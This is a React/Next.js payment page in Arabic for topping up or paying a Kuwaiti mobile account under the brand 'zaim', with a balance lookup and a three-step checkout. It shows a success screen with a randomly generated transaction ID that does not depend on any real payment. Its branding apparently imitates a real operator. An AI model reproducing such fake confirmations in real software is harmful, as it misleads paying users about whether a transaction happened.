"use client"

import { useState, useEffect } from "react"
import {
  ChevronDown,
  Heart,
  Loader2,
  Menu,
  Plus,
  ShoppingCart,
  Phone,
  CreditCard,
  Clock,
  ArrowRight,
  CheckCircle,
} from "lucide-react"
import { cn } from "@/lib/utils"
import { useRouter } from "next/navigation"
import { motion, AnimatePresence } from "framer-motion"

export default function PayPage() {
  const [selectedTab, setSelectedTab] = useState("bill")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [loading, setIsLoading] = useState(true)
  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
  const [selectedAmount, setSelectedAmount] = useState("29.900")
  const [fees, setFees] = useState("-0.600")
  const [total, setTotal] = useState("0.000")
  const [balanceData, setBalanceData] = useState<any | null>(null)
  const [isLoadingBalance, setIsLoadingBalance] = useState(false)
  const [balanceError, setBalanceError] = useState<string | null>(null)
  const [showNumberType, setShowNumberType] = useState(false)
  const [numberType, setNumberType] = useState("رقم آخر")
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [paymentStep, setPaymentStep] = useState(1)
  const [paymentSuccess, setPaymentSuccess] = useState(false)
  const [transactionId, setTransactionId] = useState("")

  useEffect(() => {
    // Calculate total based on selected amount and fees
    const totalAmount = Math.max(0, Number.parseFloat(selectedAmount) + Number.parseFloat(fees)).toFixed(3)
    setTotal(totalAmount)
  }, [selectedAmount, fees])

  const router = useRouter()

  useEffect(() => {
    // Fetch balance when phone number changes and has 8 digits
    if (phoneNumber.length === 8) {
      getBalance(phoneNumber)
    }
  }, [phoneNumber])

  const getBalance = async (number: string) => {
    setIsLoadingBalance(true)
    setBalanceError(null)

    try {
      // Use the server API route
      const response = await fetch("/api/balance", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phoneNumber: number }),
      })

      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }

      const data = await response.json()
      setBalanceData(data)

      // Update the selected amount based on the balance due
      if (data.dueAmount) {
        setSelectedAmount(data.dueAmount)
      }
    } catch (error) {
      console.error("Failed to fetch balance:", error)
      setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsLoadingBalance(false)
    }
  }

  useEffect(() => {
    setTimeout(() => {
      setIsLoading(false)
    }, 2000)
  }, [])

  const amounts = [
    { value: "2.000", validity: 7 },
    { value: "4.000", validity: 15 },
    { value: "6.000", validity: 30 },
    { value: "12.000", validity: 90 },
    { value: "22.000", validity: 180 },
    { value: "30.000", validity: 365 },
  ]

  useEffect(() => {
    localStorage.setItem("amount", selectedAmount)
  }, [selectedAmount])

  const handleSubmit = async () => {
    if (paymentStep === 1) {
      // Move to payment method selection
      setPaymentStep(2)
      return
    }

    if (paymentStep === 2 && !paymentMethod) {
      // Require payment method selection
      alert("الرجاء اختيار طريقة الدفع")
      return
    }

    setIsSubmitted(true)

    try {
      const visitorId = localStorage.getItem("visitor") || "unknown"

      // Use the server API route
      const response = await fetch("/api/submit-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phoneNumber,
          amount: selectedAmount,
          paymentMethod,
          visitorId,
        }),
      })

      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }

      const data = await response.json()

      // Generate a random transaction ID
      setTransactionId(Math.random().toString(36).substring(2, 10).toUpperCase())

      // Show success state
      setTimeout(() => {
        setPaymentSuccess(true)
        setIsSubmitted(false)
      }, 2000)
    } catch (error) {
      console.error("Error submitting payment:", error)
      setIsSubmitted(false)
      // Show error message to user
      alert("حدث خطأ أثناء تقديم الدفع. يرجى المحاولة مرة أخرى.")
    }
  }

  // Payment methods
  const paymentMethods = [
    { id: "credit-card", name: "بطاقة ائتمان", icon: "💳" },
    { id: "knet", name: "K-NET", icon: "🏦" },
    { id: "wallet", name: "محفظة إلكترونية", icon: "📱" },
  ]

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-white">
        <div className="flex flex-col items-center">
          <div className="w-16 h-16 border-4 border-t-[#d13c8c] border-r-[#d13c8c] border-b-transparent border-l-transparent rounded-full animate-spin mb-4"></div>
          <p className="text-[#2d1a45] font-medium">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  if (paymentSuccess) {
    return (
      <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen p-5" dir="rtl">
        <div className="flex items-center mb-6">
          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
          <h2 className="text-2xl font-bold text-[#2d1a45]">تأكيد الدفع</h2>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-8 mb-6">
          <div className="flex flex-col items-center justify-center text-center">
            <div className="bg-green-50 p-4 rounded-full mb-4">
              <CheckCircle className="h-16 w-16 text-green-500" />
            </div>
            <h3 className="text-xl font-bold text-[#2d1a45] mb-2">تم الدفع بنجاح</h3>
            <p className="text-gray-600 mb-6">شكراً لك. تمت عملية الدفع بنجاح وتم تحديث رصيد حسابك.</p>

            <div className="w-full bg-gray-50 rounded-lg p-4 mb-6">
              <div className="flex justify-between items-center mb-2">
                <span className="font-medium">رقم المعاملة:</span>
                <span className="text-gray-600">{transactionId}</span>
              </div>
              <div className="flex justify-between items-center mb-2">
                <span className="font-medium">التاريخ:</span>
                <span className="text-gray-600">{new Date().toLocaleDateString("ar-KW")}</span>
              </div>
              <div className="flex justify-between items-center mb-2">
                <span className="font-medium">المبلغ:</span>
                <span className="text-gray-600">{selectedAmount} د.ك</span>
              </div>
              <div className="flex justify-between items-center mb-2">
                <span className="font-medium">رقم الهاتف:</span>
                <span className="text-gray-600">{phoneNumber}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-medium">الحالة:</span>
                <span className="text-green-600">مكتمل</span>
              </div>
            </div>

            <button
              onClick={() => router.push("/")}
              className="w-full py-3 bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white rounded-lg font-medium text-center"
            >
              العودة إلى الصفحة الرئيسية
            </button>
          </div>
        </div>

        <div className="text-center text-sm text-gray-500 mt-8">
          <p>© {new Date().getFullYear()} zaim. جميع الحقوق محفوظة</p>
        </div>
      </div>
    )
  }

  return (
    <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen" dir="rtl">
      {/* Header */}
      <header className="flex items-center justify-between p-4 bg-gradient-to-r from-[#2d1a45] to-[#3a2259] shadow-md">
        <div className="flex items-center space-x-3">
          <div className="bg-white/10 backdrop-blur-sm rounded-full p-2 hover:bg-white/20 transition-colors">
            <Heart className="text-white" size={20} />
          </div>
          <div className="bg-white rounded-full p-2 hover:bg-gray-100 transition-colors">
            <ShoppingCart className="text-[#2d1a45]" size={20} />
          </div>
        </div>

        <div className="flex items-center">
          <img src="/next.svg" alt="zaim Logo" className="h-12 ml-2" />
          <Menu className="text-white hover:text-gray-200 transition-colors cursor-pointer" size={24} />
        </div>
      </header>

      {/* Main Content */}
      <div className="p-5">
        <div className="flex items-center mb-6">
          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
          <h2 className="text-2xl font-bold text-[#2d1a45]">صفحة الدفع</h2>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex flex-col items-center">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center ${
                paymentStep >= 1 ? "bg-[#d13c8c] text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              1
            </div>
            <span className="text-xs mt-1 text-gray-600">المعلومات</span>
          </div>
          <div className="flex-1 h-1 mx-2 bg-gray-200">
            <div
              className="h-full bg-[#d13c8c] transition-all duration-300"
              style={{ width: paymentStep >= 2 ? "100%" : "0%" }}
            ></div>
          </div>
          <div className="flex flex-col items-center">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center ${
                paymentStep >= 2 ? "bg-[#d13c8c] text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              2
            </div>
            <span className="text-xs mt-1 text-gray-600">طريقة الدفع</span>
          </div>
          <div className="flex-1 h-1 mx-2 bg-gray-200">
            <div
              className="h-full bg-[#d13c8c] transition-all duration-300"
              style={{ width: paymentStep >= 3 ? "100%" : "0%" }}
            ></div>
          </div>
          <div className="flex flex-col items-center">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center ${
                paymentStep >= 3 ? "bg-[#d13c8c] text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              3
            </div>
            <span className="text-xs mt-1 text-gray-600">التأكيد</span>
          </div>
        </div>

        {/* Step 1: Information */}
        {paymentStep === 1 && (
          <>
            {/* Tabs */}
            <div className="flex border-b mb-8 bg-white rounded-t-lg shadow-sm">
              <button
                className={cn(
                  "flex-1 py-4 text-center font-medium transition-all duration-200",
                  selectedTab === "bill"
                    ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50"
                    : "text-gray-500 hover:text-gray-700 hover:bg-gray-50",
                )}
                onClick={() => setSelectedTab("bill")}
              >
                <div className="flex items-center justify-center">
                  <CreditCard className="mr-2" size={18} />
                  دفع الفاتورة
                </div>
              </button>
              <button
                className={cn(
                  "flex-1 py-4 text-center font-medium transition-all duration-200",
                  selectedTab === "recharge"
                    ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50"
                    : "text-gray-500 hover:text-gray-700 hover:bg-gray-50",
                )}
                onClick={() => setSelectedTab("recharge")}
              >
                <div className="flex items-center justify-center">
                  <Phone className="mr-2" size={18} />
                  إعادة تعبئة eeZee
                </div>
              </button>
            </div>

            {/* Form */}
            <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
              <div className="text-right mb-4">
                <p className="text-[#2d1a45] font-medium">أدخل معلومات الدفع</p>
              </div>

              <div className="relative mb-6">
                <div
                  className="w-full flex justify-between items-center border-b-2 border-[#d13c8c] pb-2 cursor-pointer"
                  onClick={() => setShowNumberType(!showNumberType)}
                >
                  <div className="flex items-center">
                    <ChevronDown
                      className={`text-[#d13c8c] transition-transform duration-300 ${
                        showNumberType ? "rotate-180" : ""
                      }`}
                    />
                    <span className="mr-2 text-gray-700">{numberType}</span>
                  </div>
                  <span className="text-gray-500 text-sm">نوع الرقم</span>
                </div>

                {/* Number Type Dropdown */}
                <AnimatePresence>
                  {showNumberType && (
                    <motion.div
                      className="absolute z-10 bg-white shadow-lg w-full mt-1 border rounded-md overflow-hidden"
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -10 }}
                      transition={{ duration: 0.2 }}
                    >
                      <div
                        className="p-3 hover:bg-gray-50 cursor-pointer flex justify-between items-center"
                        onClick={() => {
                          setNumberType("رقم آخر")
                          setShowNumberType(false)
                        }}
                      >
                        <span>رقم آخر</span>
                        {numberType === "رقم آخر" && (
                          <div className="w-4 h-4 rounded-full bg-[#d13c8c] flex items-center justify-center">
                            <div className="w-2 h-2 rounded-full bg-white"></div>
                          </div>
                        )}
                      </div>
                      <div
                        className="p-3 hover:bg-gray-50 cursor-pointer flex justify-between items-center"
                        onClick={() => {
                          setNumberType("رقم العقد")
                          setShowNumberType(false)
                        }}
                      >
                        <span>رقم العقد</span>
                        {numberType === "رقم العقد" && (
                          <div className="w-4 h-4 rounded-full bg-[#d13c8c] flex items-center justify-center">
                            <div className="w-2 h-2 rounded-full bg-white"></div>
                          </div>
                        )}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              <div className="mb-6">
                <label className="block text-right mb-2 font-medium text-[#2d1a45]">
                  رقم الهاتف <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    type="tel"
                    maxLength={12}
                    placeholder="أدخل الرقم 9XXXXXX"
                    className="w-full p-4 border border-gray-300 rounded-lg text-right pr-12 focus:outline-none focus:ring-2 focus:ring-[#d13c8c] focus:border-transparent transition-all"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                  />
                  <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                    <Phone className="h-5 w-5 text-gray-400" />
                  </div>

                  {isLoadingBalance && (
                    <div className="absolute inset-y-0 left-0 flex items-center pl-3">
                      <Loader2 className="h-5 w-5 text-[#d13c8c] animate-spin" />
                    </div>
                  )}

                  {phoneNumber.length === 8 && balanceData && !isLoadingBalance && (
                    <div className="absolute inset-y-0 left-0 flex items-center pl-3">
                      <div className="h-5 w-5 rounded-full bg-green-500 flex items-center justify-center">
                        <svg className="h-3 w-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    </div>
                  )}
                </div>

                {balanceError && <p className="mt-2 text-red-500 text-sm">{balanceError}</p>}

                {balanceData && (
                  <motion.div
                    className="mt-3 p-3 bg-green-50 border border-green-100 rounded-md"
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                  >
                    <p className="text-green-800 text-sm">تم العثور على معلومات الحساب</p>
                  </motion.div>
                )}
              </div>

              <div className="relative mb-6">
                <div
                  className="flex justify-between items-center border-b-2 border-[#d13c8c] py-4 cursor-pointer"
                  onClick={() => setShowAmountDropdown(!showAmountDropdown)}
                >
                  <div className="flex items-center">
                    <ChevronDown
                      className={`text-[#d13c8c] transition-transform duration-300 ${
                        showAmountDropdown ? "rotate-180" : ""
                      }`}
                    />
                    <span className="mr-2 font-medium">{selectedAmount} د.ك</span>
                  </div>
                  <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
                </div>
                <div className="text-right text-sm text-gray-500 mt-2 flex items-center">
                  <Clock className="inline-block ml-1" size={14} />
                  الصلاحية 30 يوم
                </div>

                {/* Dropdown */}
                <AnimatePresence>
                  {showAmountDropdown && (
                    <motion.div
                      className="absolute z-10 bg-white shadow-lg w-full mt-2 border rounded-md overflow-hidden"
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -10 }}
                      transition={{ duration: 0.2 }}
                    >
                      {amounts.map((amount) => (
                        <div
                          key={amount.value}
                          className={`flex justify-between p-3 cursor-pointer hover:bg-gray-50 transition-colors ${
                            selectedAmount === amount.value ? "bg-pink-50" : ""
                          }`}
                          onClick={() => {
                            localStorage.setItem("amount", amount.value)
                            setSelectedAmount(amount.value)
                            setShowAmountDropdown(false)
                          }}
                        >
                          <div className="flex items-center">
                            {selectedAmount === amount.value ? (
                              <div className="w-5 h-5 rounded-full bg-[#d13c8c] flex items-center justify-center mr-2">
                                <svg
                                  className="w-3 h-3 text-white"
                                  fill="none"
                                  viewBox="0 0 24 24"
                                  stroke="currentColor"
                                >
                                  <path
                                    strokeLinecap="round"
                                    strokeLinejoin="round"
                                    strokeWidth="2"
                                    d="M5 13l4 4L19 7"
                                  ></path>
                                </svg>
                              </div>
                            ) : (
                              <div className="w-5 h-5 rounded-full border border-gray-300 mr-2"></div>
                            )}
                            <span className="font-medium">{amount.value} د.ك</span>
                          </div>
                          <div className="flex items-center">
                            <Clock className="inline-block ml-1" size={14} />
                            <span>الصلاحية {amount.validity} يوم</span>
                          </div>
                        </div>
                      ))}
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              {/* Add Another Number Button */}
              <button className="w-full p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center hover:bg-pink-50 transition-colors">
                <Plus className="h-5 w-5 ml-2" />
                <span>أضف رقم آخر</span>
              </button>
            </div>
          </>
        )}

        {/* Step 2: Payment Method */}
        {paymentStep === 2 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
            <h3 className="text-lg font-bold text-[#2d1a45] mb-4">اختر طريقة الدفع</h3>

            <div className="space-y-3">
              {paymentMethods.map((method) => (
                <div
                  key={method.id}
                  className={`p-4 border rounded-lg cursor-pointer transition-all ${
                    paymentMethod === method.id
                      ? "border-[#d13c8c] bg-pink-50"
                      : "border-gray-200 hover:border-[#d13c8c] hover:bg-pink-50/30"
                  }`}
                  onClick={() => setPaymentMethod(method.id)}
                >
                  <div className="flex items-center">
                    <div className="text-2xl ml-3">{method.icon}</div>
                    <div className="flex-1">
                      <p className="font-medium">{method.name}</p>
                    </div>
                    <div>
                      {paymentMethod === method.id ? (
                        <div className="w-6 h-6 rounded-full bg-[#d13c8c] flex items-center justify-center">
                          <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                          </svg>
                        </div>
                      ) : (
                        <div className="w-6 h-6 rounded-full border-2 border-gray-300"></div>
                      )}
                    </div>
                  </div>
                </div>
              ))}
            </div>

            <div className="mt-6 flex items-center">
              <button
                className="px-4 py-2 border border-[#d13c8c] text-[#d13c8c] rounded-lg mr-3 hover:bg-pink-50"
                onClick={() => setPaymentStep(1)}
              >
                رجوع
              </button>
            </div>
          </div>
        )}

        {/* Summary Card */}
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <h3 className="text-lg font-bold text-[#2d1a45] mb-4">ملخص الطلب</h3>

          <div className="space-y-3">
            <div className="flex justify-between items-center pb-2">
              <div className="text-gray-700">{selectedAmount} د.ك</div>
              <div className="text-gray-700">مبلغ التعبئة</div>
            </div>

            <div className="flex justify-between items-center pb-2">
              <div className="text-gray-700">{fees} د.ك</div>
              <div className="text-gray-700">الرسوم</div>
            </div>

            <div className="flex justify-between items-center pt-3 border-t border-dashed">
              <div className="text-[#d13c8c] font-bold text-xl">{total} د.ك</div>
              <div className="text-[#2d1a45] font-bold">الإجمالي</div>
            </div>
          </div>
        </div>

        {/* Payment Button */}
        <motion.button
          className={`w-full py-4 rounded-lg font-medium text-lg flex items-center justify-center ${
            isSubmitted || (paymentStep === 1 && phoneNumber === "")
              ? "bg-gray-300 text-gray-500 cursor-not-allowed"
              : "bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white shadow-md hover:shadow-lg"
          }`}
          whileTap={{ scale: isSubmitted || (paymentStep === 1 && phoneNumber === "") ? 1 : 0.98 }}
          disabled={isSubmitted || (paymentStep === 1 && phoneNumber === "")}
          onClick={handleSubmit}
        >
          {isSubmitted ? (
            <>
              <Loader2 className="animate-spin mr-2" size={20} />
              جاري الدفع...
            </>
          ) : paymentStep === 1 ? (
            <>
              <ArrowRight className="mr-2" size={20} />
              متابعة
            </>
          ) : (
            <>
              <CreditCard className="mr-2" size={20} />
              إتمام الدفع
            </>
          )}
        </motion.button>

        {/* Help text */}
        <div className="mt-4 text-center">
          <button
            onClick={() => router.push("/")}
            className="text-[#2d1a45] text-sm hover:underline flex items-center justify-center mx-auto"
          >
            العودة إلى الصفحة الرئيسية
          </button>
        </div>
      </div>
    </div>
  )
}
